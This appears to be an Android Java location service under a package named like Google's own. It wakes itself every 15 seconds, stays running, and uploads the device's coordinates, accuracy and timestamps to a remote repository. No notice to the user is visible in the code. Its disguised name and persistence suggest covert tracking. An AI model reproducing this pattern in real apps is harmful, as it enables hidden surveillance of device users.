package com.google.android.apps.service;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.location.Location;
import android.location.LocationManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.util.Log;

import com.google.android.apps.App;
import com.google.android.apps.repositories.models.events.Position;
import com.google.android.apps.utils.DateUtils;
import com.google.android.apps.utils.Preferences;

import java.util.Calendar;
import java.util.concurrent.TimeUnit;

import io.reactivex.Maybe;
import ru.solodovnikov.rx2locationmanager.LocationRequestBuilder;
import ru.solodovnikov.rx2locationmanager.LocationTime;
import ru.solodovnikov.rx2locationmanager.RxLocationManager;
import timber.log.Timber;

public class LocationService extends Service {
    private final String TAG = LocationService.class.getSimpleName();
    private static final int SERVICE_REQUEST_CODE = 15;

    protected LocationManager locationManager;
    private Preferences preferences;
    private RxLocationManager rxLocationManager;
    private LocationRequestBuilder locationRequestBuilder;

    @Override
    public void onCreate() {
        preferences = App.getAppComponent().getPreferences();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "onStartCommand " + preferences.isLocation());
        if (preferences.isLocation()) {
            rxLocationManager = new RxLocationManager(this);
            locationRequestBuilder = new LocationRequestBuilder(this);
            startTracker();
        }

        Calendar cal = Calendar.getInstance();
        cal.add(Calendar.SECOND, 15);
        PendingIntent servicePendingIntent = PendingIntent.getService(this,
                SERVICE_REQUEST_CODE, new Intent(this, LocationService.class),// SERVICE_REQUEST_CODE
                PendingIntent.FLAG_UPDATE_CURRENT);
        AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
        am.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(),
                servicePendingIntent);
        super.onStartCommand(intent, flags, startId);
        return Service.START_STICKY;
    }

    private void startTracker() {
        try {
            int locationMode = preferences.getLocationMode();
            locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
            Log.d(TAG, "locationMode " + locationMode);

            // getting GPS status
//            boolean isGPSEnabled = locationManager
//                    .isProviderEnabled(LocationManager.GPS_PROVIDER);
//            Log.d(TAG, "isGPS " + Boolean.toString(isGPSEnabled));
//            // getting network
//            boolean isNetworkProviderEnable = locationManager
//                    .isProviderEnabled(LocationManager.NETWORK_PROVIDER);
//
//            boolean isPassiveProviderEnable = locationManager
//                    .isProviderEnabled(LocationManager.PASSIVE_PROVIDER);

//            isGPSProvider = locationMode == Constants.GPS_PROVIDER && isGPSEnabled;
//            isNetworkProvider = locationMode == Constants.NETWORK_PROVIDER && isNetworkProviderEnable;
//            isPassiveProvider = locationMode == Constants.PASSIVE_PROVIDER && isPassiveProviderEnable;

            switch (locationMode) {
                case 0:
//                    initHighAccuracyLocation()
                    initBalancedPowerLocation();
//                            .doOnSubscribe(locationSettingsResult -> Log.d(TAG, locationSettingsResult.getStatus().getStatusMessage()))
//                            .flatMapObservable(this::getAddressObservable)
//                            .observeOn(AndroidSchedulers.mainThread())
//                            .subscribe(this::onAddressUpdate, throwable -> Log.e("MainPresenter", "Error fetching location/address updates", throwable))
                    ;
                    break;
                case 1:
                    initBalancedPowerLocation();
                    break;
                case 2:
                    initNoPowerLocation();
                    break;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private <R> void onAddressUpdate(R r) {

    }

    private void initHighAccuracyLocation() {
       locationRequestBuilder
                .addLastLocation(LocationManager.GPS_PROVIDER, new LocationTime(30, TimeUnit.MINUTES))
                .addRequestLocation(LocationManager.GPS_PROVIDER, new LocationTime(40, TimeUnit.SECONDS))
                .setDefaultLocation(new Location(LocationManager.GPS_PROVIDER))
                .create()
                .subscribe(this::sendData,
                        throwable -> Log.d(TAG, "error: " + throwable),
                        () -> {
                            final String pattern = "%s Completed:";
                            Log.d(TAG, String.format(pattern, "r"));
                        });
        ;

//        testSubscribe(maybe, "requestBuild");
//        return rxLocation.settings().check(locationRequest);
    }

    private void initBalancedPowerLocation() {
      locationRequestBuilder
                .addLastLocation(LocationManager.NETWORK_PROVIDER, new LocationTime(30, TimeUnit.MINUTES))
                .addRequestLocation(LocationManager.NETWORK_PROVIDER, new LocationTime(40, TimeUnit.SECONDS))
                .setDefaultLocation(new Location(LocationManager.PASSIVE_PROVIDER))
                .create()

                .subscribe(this::sendData,
                throwable -> Log.d(TAG, "error: " + throwable),
                () -> {
                    final String pattern = "%s Completed:";
                    Log.d(TAG, String.format(pattern, "r"));
                });
//        testSubscribe(maybe, "requestBuild");

    }


    private void initNoPowerLocation() {
        final Maybe<Location> maybe = locationRequestBuilder
                .addLastLocation(LocationManager.NETWORK_PROVIDER, new LocationTime(30, TimeUnit.MINUTES))
                .addRequestLocation(LocationManager.PASSIVE_PROVIDER, new LocationTime(40, TimeUnit.SECONDS))
                .setDefaultLocation(new Location(LocationManager.PASSIVE_PROVIDER))
                .create();

        testSubscribe(maybe, "requestBuild");

    }

    private void testSubscribe(Maybe<Location> maybe, final String methodName) {
        maybe.subscribe(t -> Log.d(TAG, t + " " + methodName),
                throwable -> Log.d(TAG, throwable + " " + methodName),
                () -> {
                    final String pattern = "%s Completed:";
                    Log.d(TAG, String.format(pattern, methodName));
                });
    }

    private boolean isOnline() {
        ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo netInfo = cm.getActiveNetworkInfo();
        return netInfo != null && netInfo.isConnectedOrConnecting();
    }


    private void sendData(Location location) {
        Log.d(TAG, location.toString());
        if (Double.compare(location.getLatitude(), location.getLongitude()) != 0) {
            Log.d(TAG, "sendData");
            Position position = Position.newBuilder()
                    .longitude(location.getLongitude())
                    .latitude(location.getLatitude())
                    .accuracy(location.getAccuracy())
                    .date(DateUtils.convertMilliSecondsToFormattedDate(location.getTime()))
                    .method(location.getProvider()).build();
            App.getAppComponent().getNetworkRepo()
                    .addPosition(position);
        }

    }
}
